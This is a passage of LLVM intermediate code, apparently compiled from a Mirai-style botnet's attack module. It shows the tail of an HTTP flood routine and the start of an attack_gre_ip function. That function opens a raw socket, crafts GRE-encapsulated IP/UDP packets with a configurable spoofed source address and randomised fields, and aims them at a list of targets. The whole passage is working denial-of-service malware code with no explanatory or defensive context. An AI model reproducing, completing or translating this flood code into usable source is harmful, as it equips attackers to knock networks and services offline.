  %2311 = sext i32 %2310 to i64
  %2312 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2305, i64 0, i64 %2311
  store i8 0, i8* %2312, align 1
  br label %2313

; <label>:2313:                                   ; preds = %2303, %2283
  %2314 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2315 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2314, i32 0, i32 18
  %2316 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2315, i32 0, i32 0
  %2317 = call i32 @util_atoi(i8* %2316, i32 16)
  store i32 %2317, i32* %63, align 4
  %2318 = load i32, i32* %63, align 4
  %2319 = icmp eq i32 %2318, 0
  br i1 %2319, label %2320, label %2323

; <label>:2320:                                   ; preds = %2313
  %2321 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2322 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2321, i32 0, i32 1
  store i8 1, i8* %2322, align 4
  br label %2384

; <label>:2323:                                   ; preds = %2313
  %2324 = load i32, i32* %63, align 4
  %2325 = add nsw i32 %2324, 2
  %2326 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2327 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2326, i32 0, i32 14
  store i32 %2325, i32* %2327, align 4
  %2328 = load i32, i32* %62, align 4
  store i32 %2328, i32* %59, align 4
  br label %2329

; <label>:2329:                                   ; preds = %2323, %2274
  br label %2346

; <label>:2330:                                   ; preds = %2269
  %2331 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2332 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2331, i32 0, i32 17
  %2333 = load i32, i32* %2332, align 4
  %2334 = load i32, i32* %59, align 4
  %2335 = sub nsw i32 %2333, %2334
  %2336 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2337 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2336, i32 0, i32 14
  store i32 %2335, i32* %2337, align 4
  %2338 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2339 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2338, i32 0, i32 14
  %2340 = load i32, i32* %2339, align 4
  %2341 = icmp eq i32 %2340, 0
  br i1 %2341, label %2342, label %2345

; <label>:2342:                                   ; preds = %2330
  %2343 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2344 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2343, i32 0, i32 1
  store i8 1, i8* %2344, align 4
  br label %2384

; <label>:2345:                                   ; preds = %2330
  br label %2346

; <label>:2346:                                   ; preds = %2345, %2329
  br label %2347

; <label>:2347:                                   ; preds = %2346, %2264
  %2348 = load i32, i32* %59, align 4
  %2349 = icmp eq i32 %2348, 0
  br i1 %2349, label %2350, label %2351

; <label>:2350:                                   ; preds = %2347
  br label %2384

; <label>:2351:                                   ; preds = %2347
  %2352 = load i32, i32* %59, align 4
  %2353 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2354 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2353, i32 0, i32 17
  %2355 = load i32, i32* %2354, align 4
  %2356 = sub nsw i32 %2355, %2352
  store i32 %2356, i32* %2354, align 4
  %2357 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2358 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2357, i32 0, i32 18
  %2359 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2358, i32 0, i32 0
  %2360 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2361 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2360, i32 0, i32 18
  %2362 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2361, i32 0, i32 0
  %2363 = load i32, i32* %59, align 4
  %2364 = sext i32 %2363 to i64
  %2365 = getelementptr inbounds i8, i8* %2362, i64 %2364
  %2366 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2367 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2366, i32 0, i32 17
  %2368 = load i32, i32* %2367, align 4
  %2369 = sext i32 %2368 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2359, i8* %2365, i64 %2369, i32 1, i1 false)
  %2370 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2371 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2370, i32 0, i32 18
  %2372 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2373 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2372, i32 0, i32 17
  %2374 = load i32, i32* %2373, align 4
  %2375 = sext i32 %2374 to i64
  %2376 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2371, i64 0, i64 %2375
  store i8 0, i8* %2376, align 1
  %2377 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2378 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2377, i32 0, i32 17
  %2379 = load i32, i32* %2378, align 4
  %2380 = icmp eq i32 %2379, 0
  br i1 %2380, label %2381, label %2382

; <label>:2381:                                   ; preds = %2351
  br label %2384

; <label>:2382:                                   ; preds = %2351
  br label %2383

; <label>:2383:                                   ; preds = %2382
  br label %2088

; <label>:2384:                                   ; preds = %2381, %2350, %2342, %2320, %2257
  br label %2010

; <label>:2385:                                   ; preds = %2078, %2016
  br label %2438

; <label>:2386:                                   ; preds = %2003
  %2387 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2388 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2387, i32 0, i32 1
  %2389 = load i8, i8* %2388, align 4
  %2390 = zext i8 %2389 to i32
  %2391 = icmp eq i32 %2390, 10
  br i1 %2391, label %2392, label %2437

; <label>:2392:                                   ; preds = %2386
  br label %2393

; <label>:2393:                                   ; preds = %2426, %2392
  %2394 = call i32* @__errno_location() #7
  store i32 0, i32* %2394, align 4
  %2395 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2396 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2395, i32 0, i32 0
  %2397 = load i32, i32* %2396, align 4
  %2398 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2399 = call i64 @recv(i32 %2397, i8* %2398, i64 10240, i32 16384)
  %2400 = trunc i64 %2399 to i32
  store i32 %2400, i32* %12, align 4
  %2401 = load i32, i32* %12, align 4
  %2402 = icmp eq i32 %2401, 0
  br i1 %2402, label %2403, label %2405

; <label>:2403:                                   ; preds = %2393
  %2404 = call i32* @__errno_location() #7
  store i32 104, i32* %2404, align 4
  store i32 -1, i32* %12, align 4
  br label %2405

; <label>:2405:                                   ; preds = %2403, %2393
  %2406 = load i32, i32* %12, align 4
  %2407 = icmp eq i32 %2406, -1
  br i1 %2407, label %2408, label %2426

; <label>:2408:                                   ; preds = %2405
  %2409 = call i32* @__errno_location() #7
  %2410 = load i32, i32* %2409, align 4
  %2411 = icmp ne i32 %2410, 11
  br i1 %2411, label %2412, label %2425

; <label>:2412:                                   ; preds = %2408
  %2413 = call i32* @__errno_location() #7
  %2414 = load i32, i32* %2413, align 4
  %2415 = icmp ne i32 %2414, 11
  br i1 %2415, label %2416, label %2425

; <label>:2416:                                   ; preds = %2412
  %2417 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2418 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2417, i32 0, i32 0
  %2419 = load i32, i32* %2418, align 4
  %2420 = call i32 @close(i32 %2419)
  %2421 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2422 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2421, i32 0, i32 0
  store i32 -1, i32* %2422, align 4
  %2423 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2424 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2423, i32 0, i32 1
  store i8 0, i8* %2424, align 4
  br label %2425

; <label>:2425:                                   ; preds = %2416, %2412, %2408
  br label %2427

; <label>:2426:                                   ; preds = %2405
  br label %2393

; <label>:2427:                                   ; preds = %2425
  %2428 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2429 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2428, i32 0, i32 1
  %2430 = load i8, i8* %2429, align 4
  %2431 = zext i8 %2430 to i32
  %2432 = icmp ne i32 %2431, 0
  br i1 %2432, label %2433, label %2436

; <label>:2433:                                   ; preds = %2427
  %2434 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2435 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2434, i32 0, i32 1
  store i8 1, i8* %2435, align 4
  br label %2436

; <label>:2436:                                   ; preds = %2433, %2427
  br label %2437

; <label>:2437:                                   ; preds = %2436, %2386
  br label %2438

; <label>:2438:                                   ; preds = %2437, %2385
  br label %2439

; <label>:2439:                                   ; preds = %2438, %1994
  br label %2440

; <label>:2440:                                   ; preds = %2439, %1017
  br label %2441

; <label>:2441:                                   ; preds = %2440, %1954, %1623, %1066, %1049, %1007, %975
  %2442 = load i32, i32* %9, align 4
  %2443 = add nsw i32 %2442, 1
  store i32 %2443, i32* %9, align 4
  br label %962

; <label>:2444:                                   ; preds = %962
  br label %350

; <label>:2445:                                   ; preds = %104, %99, %94, %89
  ret void
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i32 @util_strlen(i8*) #3

declare i32 @util_strcpy(i8*, i8*) #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #2

; Function Attrs: nounwind
declare i64 @time(i64*) #1

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #2

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

declare void @util_zero(i8*, i32) #3

declare i8* @util_itoa(i32, i32, i8*) #3

declare signext i8 @util_strcmp(i8*, i8*) #3

declare i64 @send(i32, i8*, i64, i32) #3

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

declare i64 @recv(i32, i8*, i64, i32) #3

declare i32 @util_stristr(i8*, i32, i8*) #3

declare signext i8 @util_strncmp(i8*, i8*, i32) #3

declare i32 @sleep(i32) #3

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_ip(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.grehdr*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca %struct.iphdr*, align 8
  %31 = alloca %struct.grehdr*, align 8
  %32 = alloca %struct.iphdr*, align 8
  %33 = alloca %struct.udphdr*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %36 = load i8, i8* %7, align 1
  %37 = zext i8 %36 to i64
  %38 = call noalias i8* @calloc(i64 %37, i64 8) #6
  %39 = bitcast i8* %38 to i8**
  store i8** %39, i8*** %13, align 8
  %40 = load i8, i8* %9, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 2, i32 0)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %14, align 1
  %44 = load i8, i8* %9, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 3, i32 65535)
  %47 = trunc i32 %46 to i16
  store i16 %47, i16* %15, align 2
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 4, i32 64)
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %16, align 1
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 5, i32 1)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %17, align 1
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 6, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %18, align 2
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 7, i32 65535)
  %63 = trunc i32 %62 to i16
  store i16 %63, i16* %19, align 2
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 0, i32 512)
  store i32 %66, i32* %20, align 4
  %67 = load i8, i8* %9, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %69 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 1, i32 1)
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %21, align 1
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 18, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %22, align 1
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = load i32, i32* @LOCAL_ADDR, align 4
  %78 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 24, i32 %77)
  store i32 %78, i32* %23, align 4
  %79 = call i64 @time(i64* null) #6
  %80 = load i32, i32* %6, align 4
  %81 = sext i32 %80 to i64
  %82 = add nsw i64 %79, %81
  %83 = trunc i64 %82 to i32
  store i32 %83, i32* %24, align 4
  %84 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %84, i32* %12, align 4
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %5
  br label %451

; <label>:87:                                     ; preds = %5
  store i32 1, i32* %11, align 4
  %88 = load i32, i32* %12, align 4
  %89 = bitcast i32* %11 to i8*
  %90 = call i32 @setsockopt(i32 %88, i32 0, i32 3, i8* %89, i32 4) #6
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %95

; <label>:92:                                     ; preds = %87
  %93 = load i32, i32* %12, align 4
  %94 = call i32 @close(i32 %93)
  br label %451

; <label>:95:                                     ; preds = %87
  store i32 0, i32* %11, align 4
  br label %96

; <label>:96:                                     ; preds = %246, %95
  %97 = load i32, i32* %11, align 4
  %98 = load i8, i8* %7, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp slt i32 %97, %99
  br i1 %100, label %101, label %249

; <label>:101:                                    ; preds = %96
  %102 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %103 = load i8**, i8*** %13, align 8
  %104 = load i32, i32* %11, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8*, i8** %103, i64 %105
  store i8* %102, i8** %106, align 8
  %107 = load i8**, i8*** %13, align 8
  %108 = load i32, i32* %11, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8*, i8** %107, i64 %109
  %111 = load i8*, i8** %110, align 8
  %112 = bitcast i8* %111 to %struct.iphdr*
  store %struct.iphdr* %112, %struct.iphdr** %25, align 8
  %113 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %114 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %113, i64 1
  %115 = bitcast %struct.iphdr* %114 to %struct.grehdr*
  store %struct.grehdr* %115, %struct.grehdr** %26, align 8
  %116 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %117 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %116, i64 1
  %118 = bitcast %struct.grehdr* %117 to %struct.iphdr*
  store %struct.iphdr* %118, %struct.iphdr** %27, align 8
  %119 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %120 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %119, i64 1
  %121 = bitcast %struct.iphdr* %120 to %struct.udphdr*
  store %struct.udphdr* %121, %struct.udphdr** %28, align 8
  %122 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %123 = bitcast %struct.iphdr* %122 to i8*
  %124 = load i8, i8* %123, align 4
  %125 = and i8 %124, 15
  %126 = or i8 %125, 64
  store i8 %126, i8* %123, align 4
  %127 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %128 = bitcast %struct.iphdr* %127 to i8*
  %129 = load i8, i8* %128, align 4
  %130 = and i8 %129, -16
  %131 = or i8 %130, 5
  store i8 %131, i8* %128, align 4
  %132 = load i8, i8* %14, align 1
  %133 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %134 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %133, i32 0, i32 1
  store i8 %132, i8* %134, align 1
  %135 = load i32, i32* %20, align 4
  %136 = sext i32 %135 to i64
  %137 = add i64 52, %136
  %138 = trunc i64 %137 to i16
  %139 = call zeroext i16 @htons(i16 zeroext %138) #7
  %140 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %141 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %140, i32 0, i32 2
  store i16 %139, i16* %141, align 2
  %142 = load i16, i16* %15, align 2
  %143 = call zeroext i16 @htons(i16 zeroext %142) #7
  %144 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %145 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %144, i32 0, i32 3
  store i16 %143, i16* %145, align 4
  %146 = load i8, i8* %16, align 1
  %147 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %148 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %147, i32 0, i32 5
  store i8 %146, i8* %148, align 4
  %149 = load i8, i8* %17, align 1
  %150 = icmp ne i8 %149, 0
  br i1 %150, label %151, label %155

; <label>:151:                                    ; preds = %101
  %152 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %153 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %154 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %153, i32 0, i32 4
  store i16 %152, i16* %154, align 2
  br label %155

; <label>:155:                                    ; preds = %151, %101
  %156 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %157 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %156, i32 0, i32 6
  store i8 47, i8* %157, align 1
  %158 = load i32, i32* %23, align 4
  %159 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %160 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i32 0, i32 8
  store i32 %158, i32* %160, align 4
  %161 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %162 = load i32, i32* %11, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %161, i64 %163
  %165 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %164, i32 0, i32 1
  %166 = load i32, i32* %165, align 4
  %167 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %168 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %167, i32 0, i32 9
  store i32 %166, i32* %168, align 4
  %169 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %170 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %171 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %170, i32 0, i32 1
  store i16 %169, i16* %171, align 2
  %172 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %173 = bitcast %struct.iphdr* %172 to i8*
  %174 = load i8, i8* %173, align 4
  %175 = and i8 %174, 15
  %176 = or i8 %175, 64
  store i8 %176, i8* %173, align 4
  %177 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %178 = bitcast %struct.iphdr* %177 to i8*
  %179 = load i8, i8* %178, align 4
  %180 = and i8 %179, -16
  %181 = or i8 %180, 5
  store i8 %181, i8* %178, align 4
  %182 = load i8, i8* %14, align 1
  %183 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %184 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %183, i32 0, i32 1
  store i8 %182, i8* %184, align 1
  %185 = load i32, i32* %20, align 4
  %186 = sext i32 %185 to i64
  %187 = add i64 28, %186
  %188 = trunc i64 %187 to i16
  %189 = call zeroext i16 @htons(i16 zeroext %188) #7
  %190 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 2
  store i16 %189, i16* %191, align 2
  %192 = load i16, i16* %15, align 2
  %193 = zext i16 %192 to i32
  %194 = xor i32 %193, -1
  %195 = trunc i32 %194 to i16
  %196 = call zeroext i16 @htons(i16 zeroext %195) #7
  %197 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %198 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %197, i32 0, i32 3
  store i16 %196, i16* %198, align 4
  %199 = load i8, i8* %16, align 1
  %200 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %201 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %200, i32 0, i32 5
  store i8 %199, i8* %201, align 4
  %202 = load i8, i8* %17, align 1
  %203 = icmp ne i8 %202, 0
  br i1 %203, label %204, label %208

; <label>:204:                                    ; preds = %155
  %205 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %206 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %207 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %206, i32 0, i32 4
  store i16 %205, i16* %207, align 2
  br label %208

; <label>:208:                                    ; preds = %204, %155
  %209 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %210 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %209, i32 0, i32 6
  store i8 17, i8* %210, align 1
  %211 = call i32 @rand_next()
  %212 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %213 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %212, i32 0, i32 8
  store i32 %211, i32* %213, align 4
  %214 = load i8, i8* %22, align 1
  %215 = icmp ne i8 %214, 0
  br i1 %215, label %216, label %222

; <label>:216:                                    ; preds = %208
  %217 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %218 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %217, i32 0, i32 9
  %219 = load i32, i32* %218, align 4
  %220 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %221 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %220, i32 0, i32 9
  store i32 %219, i32* %221, align 4
  br label %230

; <label>:222:                                    ; preds = %208
  %223 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %224 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %223, i32 0, i32 8
  %225 = load i32, i32* %224, align 4
  %226 = sub i32 %225, 1024
  %227 = xor i32 %226, -1
  %228 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %229 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %228, i32 0, i32 9
  store i32 %227, i32* %229, align 4
  br label %230

; <label>:230:                                    ; preds = %222, %216
  %231 = load i16, i16* %18, align 2
  %232 = call zeroext i16 @htons(i16 zeroext %231) #7
  %233 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %234 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %233, i32 0, i32 0
  store i16 %232, i16* %234, align 2
  %235 = load i16, i16* %19, align 2
  %236 = call zeroext i16 @htons(i16 zeroext %235) #7
  %237 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %238 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %237, i32 0, i32 1
  store i16 %236, i16* %238, align 2
  %239 = load i32, i32* %20, align 4
  %240 = sext i32 %239 to i64
  %241 = add i64 8, %240
  %242 = trunc i64 %241 to i16
  %243 = call zeroext i16 @htons(i16 zeroext %242) #7
  %244 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %245 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %244, i32 0, i32 2
  store i16 %243, i16* %245, align 2
  br label %246

; <label>:246:                                    ; preds = %230
  %247 = load i32, i32* %11, align 4
  %248 = add nsw i32 %247, 1
  store i32 %248, i32* %11, align 4
  br label %96

; <label>:249:                                    ; preds = %96
  br label %250

; <label>:250:                                    ; preds = %450, %249
  store i32 0, i32* %11, align 4
  br label %251

; <label>:251:                                    ; preds = %441, %250
  %252 = load i32, i32* %11, align 4
  %253 = load i8, i8* %7, align 1
  %254 = zext i8 %253 to i32
  %255 = icmp slt i32 %252, %254
  br i1 %255, label %256, label %444

; <label>:256:                                    ; preds = %251
  %257 = load i8**, i8*** %13, align 8
  %258 = load i32, i32* %11, align 4
  %259 = sext i32 %258 to i64
  %260 = getelementptr inbounds i8*, i8** %257, i64 %259
  %261 = load i8*, i8** %260, align 8
  store i8* %261, i8** %29, align 8
  %262 = load i8*, i8** %29, align 8
  %263 = bitcast i8* %262 to %struct.iphdr*
  store %struct.iphdr* %263, %struct.iphdr** %30, align 8
  %264 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %265 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %264, i64 1
  %266 = bitcast %struct.iphdr* %265 to %struct.grehdr*
  store %struct.grehdr* %266, %struct.grehdr** %31, align 8
  %267 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %268 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %267, i64 1
  %269 = bitcast %struct.grehdr* %268 to %struct.iphdr*
  store %struct.iphdr* %269, %struct.iphdr** %32, align 8
  %270 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %271 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %270, i64 1
  %272 = bitcast %struct.iphdr* %271 to %struct.udphdr*
  store %struct.udphdr* %272, %struct.udphdr** %33, align 8
  %273 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %274 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %273, i64 1
  %275 = bitcast %struct.udphdr* %274 to i8*
  store i8* %275, i8** %34, align 8
  %276 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %277 = load i32, i32* %11, align 4
  %278 = sext i32 %277 to i64
  %279 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %276, i64 %278
  %280 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %279, i32 0, i32 2
  %281 = load i8, i8* %280, align 4
  %282 = zext i8 %281 to i32
  %283 = icmp slt i32 %282, 32
  br i1 %283, label %284, label %305

; <label>:284:                                    ; preds = %256
  %285 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %286 = load i32, i32* %11, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %285, i64 %287
  %289 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %288, i32 0, i32 1
  %290 = load i32, i32* %289, align 4
  %291 = call i32 @ntohl(i32 %290) #7
  %292 = call i32 @rand_next()
  %293 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %294 = load i32, i32* %11, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %293, i64 %295
  %297 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %296, i32 0, i32 2
  %298 = load i8, i8* %297, align 4
  %299 = zext i8 %298 to i32
  %300 = lshr i32 %292, %299
  %301 = add i32 %291, %300
  %302 = call i32 @htonl(i32 %301) #7
  %303 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %304 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %303, i32 0, i32 9
  store i32 %302, i32* %304, align 4
  br label %305

; <label>:305:                                    ; preds = %284, %256
  %306 = load i32, i32* %23, align 4
  %307 = icmp eq i32 %306, -1
  br i1 %307, label %308, label %312

